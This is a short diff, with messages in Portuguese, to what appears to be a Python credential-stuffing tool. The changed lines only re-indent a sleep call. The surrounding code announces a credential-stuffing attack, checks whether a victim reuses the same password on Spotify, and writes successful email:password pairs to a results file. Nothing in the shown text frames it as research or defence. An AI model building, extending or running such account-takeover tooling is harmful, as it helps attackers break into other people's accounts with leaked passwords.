@@ -250,7 +250,7 @@ if(esc == "1"):
         	arquivo.write("[+] CREDENTIAL STUFFING > SPOTIFY: {}:{}\n".format(email,senha))
         else:
         	print(Fore.RED,"[-] O USUARIO NÃO USA A MESMA SENHA NO SPOTIFY.",Style.RESET_ALL)
-        	tempo.sleep(2)
+        tempo.sleep(2)
 
 elif(esc == "2"):
     print("\n=============================================================\n- OK, iniciando ataque de credential stuffing...\n=============================================================")
@@ -440,7 +440,7 @@ elif(esc == "2"):
         	arquivo.write("[+] CREDENTIAL STUFFING > SPOTIFY: {}:{}\n".format(email,senha))
         else:
         	print(Fore.RED,"[-] O USUARIO NÃO USA A MESMA SENHA NO SPOTIFY.",Style.RESET_ALL)
-        	tempo.sleep(2)
+        tempo.sleep(2)
 arquivo.close()
 
 
